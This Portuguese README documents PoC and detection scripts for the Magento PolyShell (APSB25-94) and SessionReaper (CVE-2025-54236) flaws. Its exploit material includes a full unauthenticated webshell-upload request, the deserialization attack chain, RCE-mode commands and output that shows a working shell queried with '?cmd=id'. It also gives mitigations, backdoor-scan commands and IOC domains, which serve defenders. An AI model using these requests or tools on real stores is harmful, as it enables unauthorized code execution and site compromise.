# PolyShell v2.0 — Magento Unauthenticated RCE & SessionReaper Detection

> **Ferramentas de detecção para APSB25-94 (PolyShell) e CVE-2025-54236 (SessionReaper)**  
> Desenvolvido por **nocerainfosec** | Baseado no PoC original de khadafigans

---

## Aviso Legal

> Estas ferramentas são destinadas **exclusivamente** para testes de segurança autorizados em infraestruturas que você possui ou tem permissão explícita para testar. O uso não autorizado contra sistemas de terceiros é ilegal e antiético. Os autores não se responsabilizam por qualquer uso indevido.

---

## Vulnerabilidades Cobertas

### APSB25-94 — PolyShell (RCE Não-Autenticado)
- **CVSS:** 9.8 CRITICAL
- **Afeta:** Magento Open Source / Adobe Commerce ≤ 2.4.9-alpha2
- **Corrigido em:** 2.4.9-beta1 / patches APSB25-94
- **Vetor:** Upload de arquivo polyglot via `POST /rest/V1/guest-carts/{id}/items` sem autenticação

**Causa raiz:** Três verificações ausentes no processamento de `file_info` em opções customizadas:
1. Sem validação de `option_id`
2. Sem verificação de tipo de produto (virtual products aceitam o upload)
3. Sem bloqueio de extensão — `getimagesizefromstring()` é bypassado via cabeçalho polyglot (`GIF89a` ou `\x89PNG`)

O arquivo é **gravado em disco antes** da validação do carrinho — por isso uma resposta HTTP 400 ainda indica upload bem-sucedido.

---

### CVE-2025-54236 — SessionReaper (CVSS 9.1)
- **CVSS:** 9.1 CRITICAL
- **Afeta:** Adobe Commerce / Magento Open Source ≤ 2.4.6-p12, 2.4.7-p6, 2.4.8-p1
- **Corrigido em:** 2.4.6-p13, 2.4.7-p7, 2.4.8-p2 (APSB25-88)
- **Vetor:** Upload não-autenticado + injeção de `savePath` via JSON aninhado → deserialização de sessão PHP → RCE

**Cadeia de ataque:**
```
1. POST /customer/address_file/upload        → planta arquivo de sessão falso
2. PUT  /rest/V1/guest-carts/abc/order       → injeta savePath via JSON aninhado
3. GET  / com PHPSESSID=<id_do_arquivo>      → session_start() deserializa nosso arquivo
4. Gadget chain Guzzle/FW1 grava payload PHP → RCE
```

> Requer sessões baseadas em arquivo (não Redis/Valkey).

---

## Instalação

```bash
git clone https://github.com/nocerainfosec/polyshell-v2
cd polyshell-v2
pip install requests urllib3
```

Para o teste de RCE completo do SessionReaper:
```bash
git clone https://github.com/ambionics/phpggc /opt/phpggc
# ou: sudo apt install phpggc
```

---

## PolyShell v2.0 — `polyshell_v2.py`

### Uso

```bash
# Detecção rápida (7 extensões prioritárias)
python3 polyshell_v2.py --target https://seusite.com --quick

# Scan completo (todas as extensões + todos os cabeçalhos)
python3 polyshell_v2.py --target https://seusite.com --header all

# Apenas detectar (sem execução de código)
python3 polyshell_v2.py --target https://seusite.com --detect-only

# Informar SKU manualmente se a descoberta automática falhar
python3 polyshell_v2.py --target https://seusite.com --sku 51 --quick

# Ignorar erros de certificado TLS
python3 polyshell_v2.py --target https://seusite.com --quick --no-verify
```

### Flags

| Flag | Padrão | Descrição |
|------|--------|-----------|
| `--target` | _(obrigatório)_ | URL do alvo, ex: `https://seusite.com` |
| `--mode` | `rce` | Modo: `rce`, `xss`, `both` |
| `--header` | `png` | Cabeçalho polyglot: `gif`, `png`, `all` |
| `--filename` | `shell` | Nome base do arquivo enviado |
| `--sku` | _(auto)_ | SKU do produto — descoberto automaticamente |
| `--threads` | `10` | Threads paralelos de upload |
| `--quick` | `false` | Apenas extensões prioritárias (7), para no primeiro RCE |
| `--detect-only` | `false` | Confirma upload sem testar execução |
| `--no-verify` | `false` | Desabilita verificação TLS |
| `--redact` | `false` | Mascara o domínio na saída (para screenshots) |

### Descoberta automática de SKU (5 estratégias)

A ferramenta tenta descobrir o SKU automaticamente:
1. **GraphQL não-autenticado** — consulta direta à API GraphQL
2. **GraphQL autenticado** — cria conta temporária e consulta
3. **REST API** — endpoint `/rest/V1/products`
4. **Scraping HTML** — atributo `data-product-sku` na página inicial
5. **Página de categoria** — fallback em `/categoria/produto.html`

### Como o ataque funciona

```
POST /rest/default/V1/guest-carts/{cartId}/items
Content-Type: application/json

{
  "cart_item": {
    "sku": "produto-simples",
    "qty": 1,
    "product_option": {
      "extension_attributes": {
        "custom_options": [{
          "option_id": "1",
          "option_value": "file",
          "extension_attributes": {
            "file_info": {
              "base64_encoded_data": "<PNG_HEADER + PHP_PAYLOAD em base64>",
              "name": "shell.php.",
              "type": "image/png"
            }
          }
        }]
      }
    }
  }
}
```

**Resposta HTTP 400 = upload bem-sucedido** (o arquivo é gravado antes da validação do carrinho).

O arquivo fica acessível em:
```
/media/custom_options/quote/{c1}/{c2}/{filename}
```
onde `{c1}` e `{c2}` são o primeiro e segundo caractere do nome do arquivo.

### Interpretação dos resultados

| Resultado | Significado |
|-----------|-------------|
| `RCE CONFIRMADO` | PHP executando — shell ativo |
| `HTML RENDERIZADO` | `.shtml` renderizando — XSS possível |
| `Somente acessível` | Arquivo enviado e acessível, mas sem execução de PHP (nginx/Apache bloqueando) |
| `Nada enviado` | Endpoint de upload bloqueado — loja corrigida ou WAF |

---

## SessionReaper — `sessionreaper_poc.py`

### Uso

```bash
# Detecção segura (sem payload, sem RCE)
python3 sessionreaper_poc.py --target https://seusite.com

# Teste de RCE completo (requer phpggc)
python3 sessionreaper_poc.py --target https://seusite.com --rce

# Apenas varredura de IOCs
python3 sessionreaper_poc.py --target https://seusite.com --ioc-only

# Caminho personalizado de escrita para a gadget chain
python3 sessionreaper_poc.py --target https://seusite.com --rce --payload-out /var/www/html/pub/errors/probe.php
```

### Flags

| Flag | Padrão | Descrição |
|------|--------|-----------|
| `--target` | _(obrigatório)_ | URL base do alvo |
| `--rce` | `false` | Executa o teste de RCE completo (requer phpggc) |
| `--phpggc` | _(auto)_ | Caminho para o binário phpggc |
| `--payload-out` | `/var/www/html/pub/errors/404.php` | Caminho de escrita remoto |
| `--no-verify` | `false` | Desabilita verificação TLS |
| `--ioc-only` | `false` | Apenas varredura passiva de IOCs |
| `--redact` | `false` | Mascara o domínio na saída (para screenshots) |

### Etapas de detecção

| Etapa | O que testa | Resultado Corrigido | Resultado Vulnerável |
|-------|-------------|---------------------|----------------------|
| 1 — Upload | `POST /customer/address_file/upload` | 403 / redirect para login | 200 + caminho do arquivo |
| 2 — Injeção | JSON aninhado com `savePath` | "invalid type" / 400 com validação | Erro de carrinho/entidade |
| 3 — Sessões | Tipo de armazenamento | Redis mencionado | Desconhecido (assumir arquivo) |
| 4 — RCE | phpggc Guzzle/FW1 + trigger | Payload não executa | Canary encontrado |

### Interpretação do veredicto

| Veredicto | Ação |
|-----------|------|
| `CRÍTICO — RCE CONFIRMADO` | Loja comprometível agora — patch urgente |
| `ALTO RISCO` | Upload + injeção funcionam — RCE depende das sessões |
| `PARCIALMENTE CORRIGIDO` | Upload aberto, injeção bloqueada — bloquear endpoint |
| `APARENTA ESTAR CORRIGIDO` | Upload e injeção bloqueados — verificar versão |

---

## Mitigações

### Para APSB25-94 (PolyShell)

**1. Aplicar o patch oficial**
```
Magento 2.4.9-beta1+ ou patches APSB25-94
```

**2. Bloquear execução de PHP na pasta de mídia (nginx)**
```nginx
location ~* ^/pub/media/.*\.(php|phtml|phar|php5|php4|php3|shtml)$ {
    deny all;
    return 403;
}
```

**3. Bloquear execução de PHP na pasta de mídia (Apache)**
```apache
<FilesMatch "\.(php|phtml|phar|php5|php4|php3|shtml)$">
    Deny from all
</FilesMatch>
```

### Para CVE-2025-54236 (SessionReaper)

**1. Aplicar o patch oficial**
```
2.4.6-p13 / 2.4.7-p7 / 2.4.8-p2 (APSB25-88)
```

**2. Bloquear endpoint de upload (nginx)**
```nginx
location = /customer/address_file/upload {
    deny all;
    return 403;
}
```

**3. Usar sessões Redis (elimina o vetor de deserialização)**
```php
# app/etc/env.php
'session' => [
    'save' => 'redis',
    'redis' => [
        'host' => '127.0.0.1',
        'port' => '6379',
        'database' => '2',
    ]
]
```

### Varredura de backdoors no servidor

```bash
# Arquivos PHP na pasta de upload de endereços
find pub/media/customer_address -type f \( -name "*.php" -o -name "*.phtml" \)

# Arquivos PHP nas opções customizadas
find pub/media/custom_options -type f \( -name "*.php" -o -name "*.phtml" \)

# Padrões de eval/base64 comuns em webshells
grep -r "eval(base64_decode" pub/ --include="*.php"

# Arquivos modificados recentemente
find pub/ -type f -name "*.php" -newer pub/index.php -mtime -30
```

### Domínios IOC para bloquear no firewall/DNS

```
sagecrafft.com
worcksbot.com
lanhd6549tdhse.top
jslibrary.net
canevaslab.com
```

---


## Exemplos de saída (prints de uso)

> Todos os exemplos usam `--redact` para mascarar o domínio testado.

### PolyShell — loja com mitigação no servidor web

```
$ python3 polyshell_v2.py --target https://sualoja.com --quick --redact

 PolyShell v2.0 | nocerainfosec | APSB25-94 | CVSS 9.8

[*] Alvo        : [REDACTED]
[*] Modo        : RCE
[*] Extensões   : prioritárias (7)

[1/5] Descobrindo SKU do produto...
[✔] SKU via página de categoria: 51
[2/5] Criando carrinho temporário...
[✔] ID do carrinho: Vr8O4sZ5HIAtv6vQCv91xQMKouFeajJg
[3/5] Preparando payloads...
[*] Total de uploads: 7 (1 cabeçalho(s) × 7 extensão(ões))
[4/5] Enviando arquivos com 10 threads...
[✔] PNG + .php.   →  shell_PNG.php.
[✔] PNG + .phtml. →  shell_PNG.phtml.
[✔] PNG + .phar.  →  shell_PNG.phar.
[✔] PNG + .shtml. →  shell_PNG.shtml.
[*] Enviados: 7/7
[5/5] Verificando execução dos arquivos enviados...

[TEST] shell_PNG.php.  (PNG)
       HTTP 403  [REDACTED]/media/custom_options/quote/s/h/shell_PNG.php.
       HTTP 404  [REDACTED]/pub/media/custom_options/quote/s/h/shell_PNG.php.
       não encontrado em nenhum caminho

══════════════════════════════════════════════════════════════════════
  POLYSHELL v2.0 — RESULTADOS  |  [REDACTED]
══════════════════════════════════════════════════════════════════════
  Uploads tentados  : 7
  RCE confirmado    : 0
  HTML renderizados : 0
  Somente acessível : 0

  Nenhum shell acessível — upload pode estar bloqueado pelo servidor web.
  Endpoint de upload aceitou os arquivos (HTTP 200/400), mas RCE não executou.
  Provável mitigação aplicada: execução de PHP bloqueada no diretório de mídia.
[✔] Resultados completos : PolyShell_v2_20260408/results.txt
```

### PolyShell — loja vulnerável (RCE confirmado)

```
$ python3 polyshell_v2.py --target https://loja-vulneravel.com --quick --redact

[5/5] Verificando execução dos arquivos enviados...

[TEST] shell_PNG.php.  (PNG)
       HTTP 200  [REDACTED]/media/custom_options/quote/s/h/shell_PNG.php.
[*] Servidor: Nginx  — ALTA probabilidade de RCE
[✔] RCE CONFIRMADO  →  [REDACTED]/media/custom_options/quote/s/h/shell_PNG.php.
[✔] whoami : www-data

══════════════════════════════════════════════════════════════════════
  POLYSHELL v2.0 — RESULTADOS  |  [REDACTED]
══════════════════════════════════════════════════════════════════════
  Uploads tentados  : 7
  RCE confirmado    : 1
  HTML renderizados : 0
  Somente acessível : 0

  !! RCE CONFIRMADO — 1 shell(s) !!
  → [REDACTED]/media/custom_options/quote/s/h/shell_PNG.php.
     whoami : www-data
     uso    : curl '[REDACTED]/media/custom_options/quote/s/h/shell_PNG.php.?cmd=id'
[✔] Shells RCE salvos : PolyShell_v2_20260408/RCE.txt
```

### SessionReaper — loja parcialmente corrigida

```
$ python3 sessionreaper_poc.py --target https://sualoja.com --redact

  Alvo   : [REDACTED]
  Modo   : Somente detecção

  [1] Testando /customer/address_file/upload (sem autenticação)...
      ✔  Upload aceito — arquivo salvo em: /p/r/probe.txt
  [2] Testando injeção de savePath via JSON aninhado (3 vetores)...
      ✔  Vetor 'order':    403 — endpoint bloqueado
      ✔  Vetor 'checkmo':  403 — endpoint bloqueado
      ✔  Vetor 'estimate': 403 — endpoint bloqueado
  [3] Verificando tipo de armazenamento de sessão...
      ⚠  Não é possível confirmar remotamente — assumir pior caso (arquivo)

  ETAPA 1 — UPLOAD   : ARQUIVO ACEITO (endpoint aberto)
  ETAPA 2 — INJEÇÃO  : Inconclusivo
  ETAPA 3 — SESSÕES  : Tipo desconhecido — assumir pior caso

  VEREDICTO: PARCIALMENTE CORRIGIDO — Endpoint de upload aberto, mas injeção bloqueada.
```

### SessionReaper — loja vulnerável (alto risco)

```
$ python3 sessionreaper_poc.py --target https://loja-vulneravel.com --redact

  [2] Testando injeção de savePath via JSON aninhado (3 vetores)...
      ⚠  Vetor 'order':    JSON aninhado processado (erro de carrinho/entidade) → pode ser VULNERÁVEL
      ⚠  Vetor 'estimate': JSON aninhado processado (erro de carrinho/entidade) → pode ser VULNERÁVEL

  ETAPA 1 — UPLOAD   : ARQUIVO ACEITO (endpoint aberto)
  ETAPA 2 — INJEÇÃO  : Vetores VULNERÁVEIS: order, estimate
  ETAPA 3 — SESSÕES  : Tipo desconhecido — assumir pior caso

  VEREDICTO: ALTO RISCO — Upload + injeção funcionam.
             RCE completo depende do tipo de armazenamento de sessão.
             Execute com --rce --phpggc /opt/phpggc/phpggc para confirmar.
```

## Melhorias da v2.0 (em relação ao PoC original)

| Recurso | PoC Original | v2.0 |
|---------|-------------|------|
| Alvo | arquivo `-t targets.txt` | `--target https://dominio.com` |
| Descoberta de SKU | manual | automática (5 estratégias) |
| Caminho de upload | adivinhado | lido da resposta da API |
| Modo rápido | não | `--quick` (7 ext, para no 1º RCE) |
| Modo detecção | não | `--detect-only` |
| Saída | básica | passo a passo com cores |
| Tratamento de Ctrl+C | não | sim |
| Idioma | inglês | português (PT-BR) |
| Página canary | referência externa | sem C2, branding próprio |

---

## Estrutura dos arquivos

```
polyshell-v2/
├── polyshell_v2.py          # PoC PolyShell APSB25-94
├── sessionreaper_poc.py     # PoC SessionReaper CVE-2025-54236
├── scan_iocs.sh             # Scanner de IOCs server-side (bash)
├── workaround_nginx.conf    # Config nginx de mitigação
├── workaround_apache.htaccess  # .htaccess de mitigação
└── README.md
```

---

## Referências

- [Adobe Security Bulletin APSB25-94](https://helpx.adobe.com/security/products/magento/apsb25-94.html)
- [Adobe Security Bulletin APSB25-88](https://helpx.adobe.com/security/products/magento/apsb25-88.html)
- [CVE-2025-54236 — SessionReaper (Flare)](https://flare.io/learn/resources/blog/sessionreaper-cve-2025-54236)
- [Sansec — Magento PolyShell Analysis](https://sansec.io)
- PoC original: [khadafigans/Magento-Polyshell-RCE](https://github.com/khadafigans/Magento-Polyshell-RCE)

---

*Desenvolvido por nocerainfosec — reescrita v2.0*
